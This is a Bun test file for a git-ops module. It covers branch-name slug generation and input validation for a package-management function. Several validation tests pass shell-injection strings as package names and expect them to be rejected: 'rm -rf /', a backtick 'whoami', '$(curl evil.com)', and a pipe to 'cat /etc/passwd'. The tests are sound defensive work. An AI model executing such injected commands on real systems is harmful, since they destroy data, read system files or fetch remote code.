// Tests for git-ops — branch naming and package validation
import { describe, expect, mock, test } from 'bun:test';

// Mock logger to suppress output
mock.module('../../utils/logger.ts', () => ({
  createLogger: () => ({
    info: mock(),
    warn: mock(),
    error: mock(),
    debug: mock(),
  }),
}));

import { generateBranchName, managePackages } from './git-ops';

describe('generateBranchName', () => {
  test('normal title produces dev/<slug>-<id>', () => {
    const result = generateBranchName(42, 'Add weekly summary');
    expect(result).toBe('dev/add-weekly-summary-42');
  });

  test('special characters are stripped or replaced with hyphens', () => {
    const result = generateBranchName(7, 'Fix bug: crash on $pecial chars!');
    expect(result).toBe('dev/fix-bug-crash-on-pecial-chars-7');
  });

  test('long title is truncated to 40 chars (slug portion)', () => {
    const longTitle =
      'Implement the very long feature that nobody asked for but we build it anyway';
    const result = generateBranchName(99, longTitle);

    const slug = result.replace('dev/', '').replace(/-99$/, '');
    expect(slug.length).toBeLessThanOrEqual(40);
    expect(result.startsWith('dev/')).toBe(true);
    expect(result.endsWith('-99')).toBe(true);
  });

  test('trailing hyphens on slug are removed before appending id', () => {
    const result = generateBranchName(1, 'hello world   ');
    expect(result).toBe('dev/hello-world-1');
    expect(result).not.toMatch(/--/);
  });
});

describe('managePackages validation', () => {
  test('rejects empty packages string', async () => {
    await expect(managePackages('/tmp', 'add', '')).rejects.toThrow('No package names provided');
  });

  test('rejects whitespace-only packages string', async () => {
    await expect(managePackages('/tmp', 'add', '   ')).rejects.toThrow('No package names provided');
  });

  test('rejects shell injection via semicolon', async () => {
    await expect(managePackages('/tmp', 'add', 'lodash; rm -rf /')).rejects.toThrow(
      'Invalid package name',
    );
  });

  test('rejects backtick injection', async () => {
    await expect(managePackages('/tmp', 'add', '`whoami`')).rejects.toThrow('Invalid package name');
  });

  test('rejects $() injection', async () => {
    await expect(managePackages('/tmp', 'add', '$(curl evil.com)')).rejects.toThrow(
      'Invalid package name',
    );
  });

  test('rejects pipe injection', async () => {
    await expect(managePackages('/tmp', 'add', 'lodash | cat /etc/passwd')).rejects.toThrow(
      'Invalid package name',
    );
  });

  // TODO: these tests run real `bun add` against npm registry — violates
  // "no real network calls in tests" rule. Should mock the Bun.$ shell call.
  // Skipped because `bun add` hangs in sandboxed/CI environments.
  test.skip('accepts valid simple package name', async () => {
    const tmpDir = await createTempPackageDir();
    const result = await managePackages(tmpDir, 'add', 'is-number');
    expect(result).toBeTruthy();
  }, 30_000);

  test.skip('accepts scoped package name', async () => {
    const tmpDir = await createTempPackageDir();
    const result = await managePackages(tmpDir, 'add', '@types/is-number');
    expect(result).toBeTruthy();
  }, 30_000);

  test.skip('accepts package with version specifier', async () => {
    const tmpDir = await createTempPackageDir();
    const result = await managePackages(tmpDir, 'add', 'is-number@7.0.0');
    expect(result).toBeTruthy();
  }, 30_000);

  test.skip('accepts multiple valid packages', async () => {
    const tmpDir = await createTempPackageDir();
    const result = await managePackages(tmpDir, 'add', 'is-number is-odd');
    expect(result).toBeTruthy();
  }, 30_000);
});

async function createTempPackageDir(): Promise<string> {
  const { mkdtemp, writeFile } = await import('node:fs/promises');
  const { tmpdir } = await import('node:os');
  const { join } = await import('node:path');
  const dir = await mkdtemp(join(tmpdir(), 'git-ops-test-'));
  await writeFile(join(dir, 'package.json'), '{"name":"test","version":"0.0.0"}');
  return dir;
}
